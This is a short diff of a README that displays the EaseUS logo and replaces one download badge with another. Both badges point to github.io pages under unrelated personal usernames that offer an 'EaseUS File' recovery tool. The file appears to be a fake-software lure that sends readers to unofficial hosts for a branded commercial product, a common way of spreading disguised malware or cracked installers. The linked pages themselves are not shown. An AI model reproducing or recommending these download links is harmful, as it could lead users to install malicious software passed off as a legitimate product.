@@ -4,10 +4,8 @@
   <img src="https://mma.prnewswire.com/media/2602314/EaseUS_Logo_Logo.jpg?p=facebook" alt="EaseUS Logo"/>
 </div>
 
-<div align="center">
+[![GET EaseUS File](https://img.shields.io/badge/GET%20%E2%80%94%20EaseUS-File-0078D6?style=for-the-badge&logoColor=white)](https://miranda825.github.io/.github/EaseUS-File)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://lashelllegnon.github.io/.github/EaseUS-File-Recovery-Tool/)
-</div>
 
 ---
 
